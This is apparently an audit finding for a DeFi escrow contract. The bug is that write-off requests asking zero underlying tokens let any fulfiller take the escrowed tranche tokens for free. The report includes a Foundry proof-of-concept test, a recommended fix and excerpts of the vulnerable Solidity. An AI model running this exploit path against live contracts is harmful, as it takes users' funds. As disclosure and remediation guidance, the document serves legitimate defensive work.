### Title
Zero-priced write-off requests let any fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that the deposited tranche amount is nonzero, but does not validate `underlyingsRequested`. A lender can therefore create a request asking for zero underlying tokens, after which any fulfiller can satisfy it with a zero payment and receive all escrowed tranche tokens. [1](#0-0) 

### Finding Description
`createWriteOffRequest` rejects `amount == 0`, transfers `amount` tranche tokens into escrow, and stores the caller-supplied `underlyingsRequested` without requiring it to be positive. [1](#0-0) 

`fullfillWriteOffRequest` only requires `_tranches` to equal the escrowed amount and `_underlyings` to be at least `currentRequest.underlyings`. If the stored requested amount is zero, a fulfiller can pass `_underlyings == 0`; the zero-value transfer and fee calculation succeed, the lender receives nothing, and the fulfiller receives the full tranche balance. [2](#0-1) 

This breaks the escrow invariant that escrowed tranche tokens are released only in exchange for the consideration requested by the lender.

### Impact Explanation
An unprivileged fulfiller can permanently acquire every tranche token escrowed in a zero-priced request without paying underlying tokens. The loss equals the full market/accounting value of the victim’s escrowed tranche position. Because requests are cumulative, a lender who repeatedly adds tranche tokens to a zero-priced request can lose the entire accumulated escrow balance. [3](#0-2) 

### Likelihood Explanation
Exploitation requires a lender to create a request with `underlyingsRequested == 0`, whether accidentally or through a malformed integration input. No privileged role, borrower cooperation, default, or special epoch transition is required beyond the running-epoch check when the request is created. Once the malformed request exists, any EOA can fulfill it before the lender deletes it. [4](#0-3) [5](#0-4) 

### Recommendation
Reject zero-consideration requests in `createWriteOffRequest`, for example:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

This check should be applied to each contribution, not only to the aggregate request. Alternatively, if intentional zero-priced transfers must remain supported, require an explicit separate mechanism rather than allowing them through the borrower write-off escrow flow.

### Proof of Concept
Insert this test into `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, using the existing mainnet-fork setup:

```solidity
function testZeroPricedRequestCanBeDrained() external {
  address buyer = makeAddr("buyer");
  uint256 trancheAmount = 10_000e18;

  uint256 sellerTranchesPre = tranche.balanceOf(LP);
  uint256 sellerUnderlyingPre = underlying.balanceOf(LP);
  uint256 buyerTranchesPre = tranche.balanceOf(buyer);

  // The lender accidentally creates a malformed zero-priced request.
  vm.prank(LP);
  escrow.createWriteOffRequest(trancheAmount, 0);

  (uint256 escrowedTranches, uint256 requestedUnderlyings) =
    escrow.userRequests(LP);
  assertEq(escrowedTranches, trancheAmount);
  assertEq(requestedUnderlyings, 0);

  // Any fulfiller can satisfy the zero ask and take all escrowed tranches.
  vm.prank(buyer);
  escrow.fullfillWriteOffRequest(LP, trancheAmount, 0);

  assertEq(sellerTranchesPre - tranche.balanceOf(LP), trancheAmount);
  assertEq(tranche.balanceOf(buyer) - buyerTranchesPre, trancheAmount);
  assertEq(underlying.balanceOf(LP), sellerUnderlyingPre);

  (escrowedTranches, requestedUnderlyings) = escrow.userRequests(LP);
  assertEq(escrowedTranches, 0);
  assertEq(requestedUnderlyings, 0);
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;

  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
